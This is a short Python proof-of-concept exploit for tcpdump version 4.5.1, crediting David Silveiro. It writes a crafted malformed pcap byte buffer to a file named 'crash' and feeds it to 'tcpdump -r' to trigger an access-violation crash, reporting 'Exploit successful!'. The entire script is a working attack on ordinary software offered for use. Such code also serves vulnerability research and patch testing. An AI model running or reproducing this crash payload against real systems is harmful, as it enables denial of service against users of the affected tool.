from subprocess import call
from shlex import split
from time import sleep
 
 
def crash():
 
    command = 'tcpdump -r crash'
 
    buffer     =   '\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff'
    buffer     +=  '\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00'
    buffer     +=  '\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00<\x9c7@\xff\x00'
    buffer     +=  '\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a'
    buffer     +=  "\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&\x80\x18\'"
    buffer     +=  "xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n', '\x00\x00\x00\x00"
    buffer     +=  '\x00\x00\x00\x00\x01\x03\x03\x04'
 
 
    with open('crash', 'w+b') as file:
        file.write(buffer)
 
    try:
        call(split(command))
        print("Exploit successful!             ")
 
    except:
        print("Error: Something has gone wrong!")
 
 
def main():
 
    print("Author:   David Silveiro                           ")
    print("   tcpdump version 4.5.1 Access Violation Crash    ")
 
    sleep(2)
 
    crash()
 
 
if __name__ == "__main__":
    main()
